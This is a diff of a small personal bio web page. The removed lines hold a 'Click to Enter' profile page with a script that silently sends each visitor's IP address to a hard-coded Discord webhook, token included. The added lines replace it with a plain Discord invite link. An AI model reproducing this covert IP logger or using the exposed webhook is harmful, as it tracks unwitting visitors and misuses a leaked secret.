@@ -3,80 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> . </title>
-    <link rel="stylesheet" href="styles.css">
+    <title> . . . </title>
     <style>
         body {
-            margin: 0;
-            overflow: hidden;
-        }
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            color: white;
             display: flex;
             justify-content: center;
             align-items: center;
-            font-family: Arial, sans-serif;
-            font-size: 24px;
-            z-index: 1000;
-            cursor: pointer;
+            height: 100vh;
+            margin: 0;
+            background-color: #black; /* Optional background color */
         }
-        .hidden {
-            display: none;
+        a img {
+            max-width: 100%;
+            height: auto;
         }
     </style>
 </head>
 <body>
-    <div class="overlay" id="overlay">
-        <p>Click to Enter</p>
-    </div>
-
-    <div class="bio-container hidden" id="content">
-        <div class="profile-picture">
-            <img src="pfp25.jpg" alt="Profile Picture">
-        </div>
-        <div class="name">
-            <h1>tailzzz</h1>
-        </div>
-        <div class="greeting">
-            <p>hi :3</p>
-        </div>
-    </div>
-
-    <audio id="introAudio" src="atm.mp4.webm"></audio>
-
-    <script>
-        document.getElementById('overlay').addEventListener('click', function() {
-            this.classList.add('hidden');
-            document.getElementById('content').classList.remove('hidden');
-            document.body.style.overflow = 'auto';
-            const audio = document.getElementById('introAudio');
-            audio.play();
-
-            // Log IP and send to Discord webhook
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const webhookUrl = 'https://discord.com/api/webhooks/1313917761042386984/Ih-JgysLsQJWQWZkC8lDHPDIPBYMTGsgzPJETBNLkYNKGBfgpx_7-Y9aNiV7cS9WL-oT';
-                    const payload = {
-                        content: `IP Address: ${data.ip}`
-                    };
-
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(payload)
-                    });
-                })
-                .catch(error => console.error('Error fetching IP:', error));
-        });
-    </script>
+    <a href="https://discord.gg/anon" target="_blank">
+        <img src="discord.png" alt="Discord">
+    </a>
 </body>
 </html>
